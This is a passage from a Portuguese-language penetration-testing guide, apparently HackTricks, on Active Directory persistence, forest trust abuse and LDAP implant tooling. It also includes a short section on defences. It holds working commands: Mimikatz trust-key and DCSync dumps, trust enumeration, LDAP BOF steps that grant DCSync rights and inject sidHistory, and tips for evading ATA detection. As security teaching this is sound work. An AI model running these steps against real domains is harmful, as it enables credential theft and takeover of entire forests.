[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar o seu **próprio SSP** para **capturar** em **clear text** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de privilégios DA** e estar dentro do **root domain**.\
Note que se você usar dados incorretos, aparecerão logs bem feios.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos como escalar privilégios se você tiver **permissão suficiente para ler senhas do LAPS**. Entretanto, essas senhas também podem ser usadas para **manter persistência**.\
Veja:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

A Microsoft vê a **Forest** como o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Forest**.

### Basic Information

Uma [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Essencialmente cria um elo entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam sem problemas. Quando domínios estabelecem uma confiança, eles trocam e retêm **chaves** específicas em seus **Domain Controllers (DCs)**, que são cruciais para a integridade da confiança.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiado**, ele deve primeiro solicitar um ticket especial conhecido como **inter-realm TGT** a partir do DC de seu próprio domínio. Esse TGT é criptografado com uma **chave** compartilhada que ambos os domínios concordaram. O usuário então apresenta esse TGT ao **DC do domínio confiado** para obter um ticket de serviço (**TGS**). Após a validação bem-sucedida do inter-realm TGT pelo DC do domínio confiado, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Steps**:

1. Um **client computer** em **Domain 1** inicia o processo usando seu **NTLM hash** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente então solicita um **inter-realm TGT** ao DC1, necessário para acessar recursos em **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte da confiança bidirecional entre domínios.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se válido, emite um **Ticket Granting Service (TGS)** para o servidor em Domain 2 que o cliente deseja acessar.
7. Finalmente, o cliente apresenta esse TGS ao servidor, que está criptografado com o hash da conta do servidor, para obter acesso ao serviço em Domain 2.

### Different trusts

É importante notar que **uma trust pode ser de 1 via ou 2 vias**. Na opção de 2 vias, ambos os domínios confiarão um no outro, mas na relação de confiança **1 via** um dos domínios será o **trusted** e o outro o **trusting**. No último caso, **você só poderá acessar recursos dentro do trusting domain a partir do trusted**.

Se o Domain A confia no Domain B, A é o trusting domain e B é o trusted. Além disso, em **Domain A**, isso seria uma **Outbound trust**; e em **Domain B**, isso seria uma **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma forest, onde um domínio filho automaticamente tem uma confiança transitiva bidirecional com seu domínio pai. Essencialmente, isso significa que solicitações de autenticação podem fluir sem problemas entre o domínio pai e o filho.
- **Cross-link Trusts**: Referidas como "shortcut trusts", elas são estabelecidas entre domínios filhos para agilizar processos de encaminhamento. Em forests complexas, os encaminhamentos de autenticação tipicamente têm que subir até a raiz da forest e então descer até o domínio alvo. Ao criar cross-links, o trajeto é encurtado, o que é especialmente benéfico em ambientes geograficamente dispersos.
- **External Trusts**: São configuradas entre domínios diferentes e não relacionados e são por natureza não-transitivas. Segundo a documentação da Microsoft, external trusts são úteis para acessar recursos em um domínio fora da forest atual que não esteja conectado por uma forest trust. A segurança é reforçada através de SID filtering em external trusts.
- **Tree-root Trusts**: Essas trusts são automaticamente estabelecidas entre o domínio root da forest e uma nova árvore de domínios adicionada. Embora não sejam comumente encontradas, tree-root trusts são importantes para adicionar novas domain trees a uma forest, permitindo que mantenham um nome de domínio único e garantindo transitividade bidirecional. Mais informações podem ser encontradas no guia da Microsoft.
- **Forest Trusts**: Este tipo de trust é uma two-way transitive trust entre dois forest root domains, aplicando também SID filtering para reforçar medidas de segurança.
- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não Windows, compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem ambientes que requerem integração com sistemas Kerberos fora do ecossistema Windows.

#### Other differences in **trusting relationships**

- Uma relação de trust também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não-transitiva**.
- Uma relação de trust pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um deles confia no outro).

### Attack Path

1. **Enumerar** as relações de confiança
2. Verificar se algum **security principal** (user/group/computer) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por estar em grupos do outro domínio. Procure por **relações através de domínios** (a trust provavelmente foi criada para isso).
1. kerberoast nesse caso poderia ser outra opção.
3. **Comprometer** as **contas** que podem **pivotar** através de domínios.

Atacantes podem obter acesso a recursos em outro domínio através de três mecanismos principais:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo-lhes controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. Entretanto, a efetividade desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, particularmente como entidades em **ACEs** dentro de uma **DACL**, fornecendo-lhes acesso a recursos específicos. Para quem quer se aprofundar na mecânica de ACLs, DACLs e ACEs, o whitepaper intitulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.

### Find external users/groups with permissions

Você pode checar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals no domínio. Estes serão user/group de **um domínio/floresta externo**.

Você pode verificar isso no **Bloodhound** ou usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 chaves de confiança**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode ver qual está sendo usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale como Enterprise admin para o child/parent domain abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

É crucial entender como o Configuration Naming Context (NC) pode ser explorado. O Configuration NC funciona como um repositório central para dados de configuração em uma floresta em ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da floresta, com DCs graváveis mantendo uma cópia gravável do Configuration NC. Para explorar isso, é necessário ter **SYSTEM privileges on a DC**, preferencialmente um child DC.

**Link GPO to root DC site**

O container Sites do Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da floresta AD. Ao operar com **SYSTEM privileges** em qualquer DC, atacantes podem vincular GPOs aos sites root do DC. Essa ação pode comprometer o root domain ao manipular as políticas aplicadas a esses sites.

Foram publicadas pesquisas detalhadas sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve mirar em gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as senhas dos gMSAs, está armazenada dentro do Configuration NC. Com **SYSTEM privileges on any DC**, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA em toda a floresta.

Análise detalhada e instruções passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com **SYSTEM privileges**, um invasor pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso não autorizado e controle sobre objetos AD recém-criados.

Leitura adicional disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 visa o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permita autenticar-se como qualquer usuário dentro da floresta. Como os objetos PKI residem no Configuration NC, comprometer um child DC gravável permite executar ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domínio de Floresta Externa - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Nesse cenário **seu domínio é confiável** por um externo, concedendo-lhe **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm quais acessos sobre o domínio externo** e então tentar explorá-lo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha de confiança**. Isso significa que é possível **utilizar um usuário do domínio que confia para entrar no domínio confiado** para enumerá-lo e tentar escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança de domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é esperar em uma máquina onde um **usuário do domínio confiado possa acessar** e fazer login via **RDP**. Em seguida, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir daí.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia gravar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de confiança de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history em trusts entre florestas é mitigado pelo SID Filtering, que está ativado por padrão em todas as trusts inter-floresta. Isso se baseia na suposição de que trusts intra-floresta são seguros, considerando a floresta, e não o domínio, como a fronteira de segurança segundo a posição da Microsoft.
- No entanto, há um problema: o SID Filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts inter-floresta, empregar Selective Authentication garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, permissões explícitas são exigidas para que usuários acessem domínios e servidores dentro do domínio ou floresta que confia.
- É importante notar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) ou ataques contra a trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs`, e então chamam `ldap <subcommand>` a partir do beacon. Todo o tráfego utiliza o contexto de segurança do logon atual sobre LDAP (389) com signing/sealing ou LDAPS (636) com auto certificate trust, portanto não são necessários socks proxies ou artefatos em disco.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolvem nomes curtos/caminhos OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute`, and `get-domaininfo` extraem atributos arbitrários (including security descriptors) além dos metadados de floresta/domínio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expõem roasting candidates, delegation settings, e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), e herança, fornecendo alvos imediatos para ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escrita LDAP para escalada & persistência

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operador prepare novos principals ou contas de máquina em qualquer OU onde existam rights sobre a OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` sequestram diretamente alvos assim que direitos de write-property são encontrados.
- Comandos focados em ACLs como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync` traduzem WriteDACL/WriteOwner em qualquer objeto AD para resets de senha, controle de membership em groups ou privilégios de DCSync sem deixar artefatos do PowerShell/ADSI. Contrapartes `remove-*` limpam ACEs injetados.

### Delegação, roasting, e abuso do Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido Kerberoastable; `add-asreproastable` (UAC toggle) o marca para AS-REP roasting sem tocar na senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, relocação de OU, e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no SID history de um principal controlado (ver [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante mova ativos para OUs onde já existem direitos delegados antes de abusar de `set-password`, `add-groupmember` ou `add-spn`.
- Comandos de remoção de escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem rollback rápido depois que o operador colhe credenciais ou persistência, minimizando telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Restrições para Domain Admins**: Recomenda-se que Domain Admins só possam fazer login em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de Service Accounts**: Serviços não devem rodar com privilégios de Domain Admin (DA) para manter a segurança.
- **Limitação temporal de privilégios**: Para tarefas que requerem privilégios de DA, a duração deve ser limitada. Isso pode ser conseguido com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de LDAP relay**: Auditar os Event IDs 2889/3074/3075 e então aplicar LDAP signing além de LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementando técnicas de Deception**

- Implementar deception envolve montar armadilhas, como usuários ou computadores decoy, com características como senhas que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre deploy de técnicas de deception pode ser encontrado em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **Para objetos de usuário**: Indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e contagens baixas de bad passwords.
- **Indicadores gerais**: Comparar atributos de possíveis objetos decoy com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar essas deceptions.

### **Evasão de sistemas de detecção**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar enumeração de sessões em Domain Controllers para prevenir detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evadir detecção ao não fazer downgrade para NTLM.
- **DCSync Attacks**: Executar a partir de um host não Domain Controller para evitar detecção pelo ATA é recomendado, já que execução direta em um Domain Controller disparará alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
